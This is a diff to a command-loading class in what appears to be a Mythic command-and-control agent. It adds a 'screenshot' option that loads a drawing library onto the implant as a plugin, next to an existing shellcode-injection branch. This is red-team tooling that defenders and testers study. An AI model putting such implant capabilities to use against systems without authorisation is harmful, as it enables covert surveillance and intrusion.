@@ -107,6 +107,17 @@ class LoadCommand(CommandBase):
             ))
             if not resp.Success:
                 raise Exception("Failed to add commands to callback: " + resp.Error)
+        elif(command == "screenshot"):
+            tasks = [MythicRPCTaskCreateSubtaskGroupTasks(
+                CommandName="load-assembly",
+                Params=json.dumps({"libraryname":"System.Drawing.Common.dll", "target":"plugin"}),
+                GroupName="InternalLib",
+            )]
+            createSubtaskMessage = MythicRPCTaskCreateSubtaskGroupMessage(task.id, 
+                                                                            "load-screenshot",
+                                                                            CommandName="load-assembly",
+                                                                            Tasks = tasks)
+            subtask = await SendMythicRPCTaskCreateSubtaskGroup(createSubtaskMessage)
         elif(command == "shellcode-inject"):
             addCommandMessage = MythicRPCCallbackAddCommandMessage(task.id, shellcode_commands)
             response = await SendMythicRPCCallbackAddCommand(addCommandMessage)
